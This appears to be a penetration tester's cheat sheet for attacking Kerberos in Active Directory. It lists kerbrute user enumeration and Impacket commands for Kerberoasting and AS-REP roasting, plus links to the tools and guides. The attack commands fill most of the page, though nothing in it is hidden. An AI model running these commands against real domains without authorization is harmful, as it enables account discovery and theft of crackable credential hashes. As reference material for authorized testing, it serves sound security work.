# Manual

## 01 - Usage

### 1.1 - Enumerate Users

- Enumerate users against the active directory

`$ ./kerbrute userenum --dc <IP> -d <domain_name> users.txt -t 64`

### 1.2 - Kerberoast

^e70af7

- Request a Kerberos 5 TGS-REP etype 23 hash from an SPN user account

`$ GetUserSPNs.py -request -dc-ip <IP> <domain_name>/<username>:<password>`

### 1.3 - ASREPRoast

^7e8f5e

- Request a Kerberos 5, etype 23, AS-REP hash from an NP user account

```
$ GetNPUsers.py -request -dc-ip <IP> <domain_name>/<username>:<password>

$ GetNPUsers.py -request -dc-ip <IP> <domain_name> -usersfile users.txt
```

---
## References

- [Impacket](https://github.com/fortra/impacket)

- [Kerbrute](https://github.com/ropnop/kerbrute)

- [Certcube: Kerberoasting Common Tools](https://blog.certcube.com/kerberoasting-common-tools/)

- [Pentesting Kerberos 88](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)